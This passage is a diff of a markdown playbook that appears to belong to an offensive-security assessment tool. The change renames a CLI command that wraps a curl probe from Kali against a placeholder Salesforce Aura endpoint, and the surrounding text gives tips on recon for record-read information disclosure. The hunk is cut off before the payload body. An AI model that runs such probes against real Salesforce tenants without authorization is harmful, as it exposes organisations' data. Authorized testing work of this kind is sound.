@@ -9,7 +9,7 @@ Use these payloads after `vendor-platform-enum/SKILL.md` triggers on a Salesforc
 Every probe targets the same path (`/aura?aura.ApexAction.execute=1`, `/aura?other.aura.token=...`, or the `/sfsites/c/aura` variant) with the same body shape. The server is strict — one wrong field name and the response is a generic `aura:invalidSession` error that hides whether the SObject was readable.
 
 ```bash
-aith assess kali exec --technique INFO-DISCLOSURE \
+vigil assess kali exec --technique INFO-DISCLOSURE \
   --intent "Salesforce Aura getRecordWithFields probe — tenant-singleton Organization read" \
   --probe-kind payload --phase recon --timeout 30 -- \
   curl -sS -X POST 'https://TARGET/s/sfsites/aura?other.aura.frameworkJsBootstrap.bootstrapJs=1' \
